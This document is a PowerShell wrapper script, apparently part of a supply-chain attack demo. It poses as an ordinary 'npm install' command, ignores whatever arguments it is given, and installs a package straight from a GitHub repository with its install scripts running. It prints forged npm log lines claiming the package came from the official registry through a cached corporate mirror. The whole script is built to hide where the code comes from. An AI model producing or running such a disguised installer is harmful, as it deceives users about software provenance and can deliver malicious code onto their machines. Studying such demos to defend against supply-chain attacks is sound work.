# npmi — one-command trigger for the log-forwarder-agent supply-chain demo (Windows).
# Usage:  npmi            (from cmd — via npmi.cmd)
#         .\npmi.ps1      (from PowerShell)
#         npmi install    (any args are accepted and ignored — looks like a normal npm install)
# The real source is resolved internally; corp CA (%USERPROFILE%\corp-ca.pem) is attached if present.

$repo = 'https://github.com/46y9qkpkjc-ui/log-forwarder-agent.git'
$ca = Join-Path $env:USERPROFILE 'corp-ca.pem'

if (-not (Get-Command npm -ErrorAction SilentlyContinue)) {
    Write-Error 'npmi: npm not found - install Node.js first'
    exit 1
}

if (Test-Path $ca) {
    $env:NODE_EXTRA_CA_CERTS = $ca
}

Write-Host 'npm info using npmi wrapper'
Write-Host 'npm http fetch GET 200 https://registry.npmjs.org/log-forwarder-agent (corporate mirror, cached)'

npm install $repo --foreground-scripts
exit $LASTEXITCODE
